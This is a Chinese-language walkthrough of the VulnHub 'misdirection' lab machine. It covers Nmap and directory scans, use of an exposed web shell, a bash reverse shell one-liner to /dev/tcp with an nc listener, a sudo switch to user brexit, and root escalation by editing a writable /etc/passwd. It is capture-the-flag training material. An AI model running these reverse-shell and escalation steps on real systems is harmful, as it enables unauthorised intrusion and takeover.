# 靶机信息
misdirection是一台vulnhub中的简单难度的渗透测试靶机。

# 初始信息收集
## Nmap扫描
先扫描开放端口的详细信息
```
└─$ nmap -sCV -p$port -O --min-rate 10000 192.168.218.210 -oA nmapScan/details
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 21:11 EST
Nmap scan report for 192.168.218.210 (192.168.218.210)
Host is up (0.00052s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 00:0C:29:58:14:A1 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
再使用vuln脚本扫一下有没有能扫出来的漏洞
```
└─$ nmap --script=vuln --min-rate 10000 -p$port 192.168.218.210 -oA nmapScan/vuln
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 21:14 EST
Nmap scan report for 192.168.218.210 (192.168.218.210)
Host is up (0.00040s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.218.210
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.218.210:80/init/default/user/login?_next=/init/default/index
|     Form id: auth_user_email__row
|     Form action: #
|     
|     Path: http://192.168.218.210:80/init/default/user/register?_next=/init/default/index
|     Form id: auth_user_first_name__row
|     Form action: #
|     
|     Path: http://192.168.218.210:80/init/default/user/request_reset_password?_next=/init/default/index
|     Form id: auth_user_email__row
|     Form action: #
|     
|     Path: http://192.168.218.210:80/init/default/elections
|     Form id: auth_user_email__row
|     Form action: #
|     
|     Path: http://192.168.218.210:80/init/default/user/register
|     Form id: auth_user_first_name__row
|     Form action: #
|     
|     Path: http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex
|     Form id: auth_user_email__row
|     Form action: #
|     
|     Path: http://192.168.218.210:80/init/default/user/login
|     Form id: auth_user_email__row
|     Form action: #
|     
|     Path: http://192.168.218.210:80/init/default/user/request_reset_password
|     Form id: auth_user_email__row
|_    Form action: #
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/register?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/register?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/register?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/register?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Felections%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/register?_next=%2Finit%2Fdefault%2Fsupport%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Fsupport%27%20OR%20sqlspider
|     http://192.168.218.210:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Fsupport%27%20OR%20sqlspider
|_    http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/admin/: Possible admin folder
|   /admin/backup/: Possible backup
|   /admin/download/backup.sql: Possible database backup
|   /examples/: Sample scripts
|   /admin/libraries/ajaxfilemanager/ajaxfilemanager.php: Log1 CMS
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
|   /admin/includes/tiny_mce/plugins/tinybrowser/upload.php: CompactCMS or B-Hind CMS/FCKeditor File upload
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
|   /admin/jscript/upload.php: Lizard Cart/Remote File upload
|   /admin/jscript/upload.html: Lizard Cart/Remote File upload
|   /admin/jscript/upload.pl: Lizard Cart/Remote File upload
|_  /admin/jscript/upload.asp: Lizard Cart/Remote File upload
3306/tcp open  mysql
8080/tcp open  http-proxy
| http-enum: 
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /debug/: Potentially interesting folder
|   /development/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /help/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /manual/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
MAC Address: 00:0C:29:58:14:A1 (VMware)

```
## 初始信息枚举

先看优先级较高的mysql服务，尝试空密码可不可以登录
```
└─$ mysql -h 192.168.218.210 -P 3306 -u root -p
Enter password: 
WARNING: option --ssl-verify-server-cert is disabled, because of an insecure passwordless login.
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.218.148' is not allowed to connect to this MySQL server
```
不行，不继续尝试爆破了，先看 80和8080 端口的 web 服务。

<img width="1919" height="974" alt="Image" src="https://github.com/user-attachments/assets/f46d7c6f-872f-44b2-ac96-56ecb98ca8a6" />

先看 80 端口的，好像是一个E-Vote投票网站。搜了一下好像没看到什么明显能直接打进去的漏洞，先注册登录，不知道为啥注册不了，那先不管了，再扫一下目录，使用gobuster扫，发现全部400，然后再使用dirsearch扫一遍，发现有个admin目录下的是200，看一下。好像没东西。还有8080端口，也先看一下。


<img width="1919" height="967" alt="Image" src="https://github.com/user-attachments/assets/4128c469-343f-4367-9a33-eceee4a54deb" />
是一个 apache 默认页面，扫一下目录

```
[22:07:17] 200 -    3KB - /debug/                                           
[22:07:17] 200 -  411B  - /development/                                     
[22:07:20] 301 -  324B  - /help  ->  http://192.168.218.210:8080/help/      
[22:07:20] 200 -  407B  - /help/                                            
[22:07:21] 301 -  326B  - /images  ->  http://192.168.218.210:8080/images/  
[22:07:21] 200 -  409B  - /images/                                          
[22:07:22] 200 -  406B  - /js/                                              
[22:07:23] 301 -  326B  - /manual  ->  http://192.168.218.210:8080/manual/  
[22:07:30] 301 -  327B  - /scripts  ->  http://192.168.218.210:8080/scripts/
[22:07:30] 200 -  407B  - /scripts/
[22:07:30] 403 -  305B  - /server-status                                    
[22:07:30] 403 -  306B  - /server-status/
[22:07:31] 301 -  325B  - /shell  ->  http://192.168.218.210:8080/shell/    
[22:07:31] 200 -  407B  - /shell/                                           
[22:07:38] 200 -    1KB - /wordpress/wp-login.php                           
[22:07:38] 200 -    4KB - /wordpress/
```
东西挺多，一次看一下，先看 debug 吧

<img width="1919" height="968" alt="Image" src="https://github.com/user-attachments/assets/bbc02a90-6d84-4506-803d-c60cbd3bc177" />

是一个shell，感觉是入口，直接给我 www-data 的权限，扒拉一下
```
p0wny@shell:/home/brexit# sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```

```
p0wny@shell:/home/brexit# sudo -u brexit /bin/bash
p0wny@shell:/home/brexit# whoami
www-data
p0wny@shell:/home/brexit# sudo -u brexit /bin/bash
p0wny@shell:/home/brexit# whoami
www-data
p0wny@shell:/home/brexit#
```
没成功，奇怪，难道是shell的问题，换netcat上去。

`/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'`

在kali开启监听，链接
```
└─$ rlwrap -cAr nc -lvnp 1234     
listening on [any] 1234 ...
connect to [192.168.218.148] from (UNKNOWN) [192.168.218.210] 35642
bash: cannot set terminal process group (794): Inappropriate ioctl for device
bash: no job control in this shell
www-data@misdirection:/var/www/html/wordpress/wp-admin$ sudo -l
sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
www-data@misdirection:/var/www/html/wordpress/wp-admin$ sudo -u brexit /bin/bash
<w/html/wordpress/wp-admin$ sudo -u brexit /bin/bash    
whoami
brexit
```

## 提权
系统中有 python 可以将 shell 升级一下，可以参考我的 [shell相关](https://dehua-rd.github.io/post/shell-xiang-guan.html)来创建和升级shell，然后正式开始提权。

brexit 目录中的文件感觉有用，先上linpeas梭一把，看到brexit用户有个定时任务
```
brexit@misdirection:~$ crontab -l
crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
@reboot /home/brexit/start-vote.sh
brexit@misdirection:~$ 
```
这个sh文件中只有一句话 `source ~/web2py/venv/bin/activate && python ~/web2py/web2py.py -a '<recycle>'`

是一个Web2Py框架还往里面传了一个参数，搜索一下有什么漏洞可以利用，找了一会发现都是brexit用户的，没法提权啊也，再翻一下刚刚linpeas的结果，发现 /etc/passwd 的组是brexit ，passwd文件是可写的，那就简单了，还好没有死磕py文件。`-rwxrwxr--  1 root brexit     1617 Jun  1  2019 passwd`

直接改brexit的用户id为0，或者添加一个新的用户ID为0的用户，就可以直接提权了。
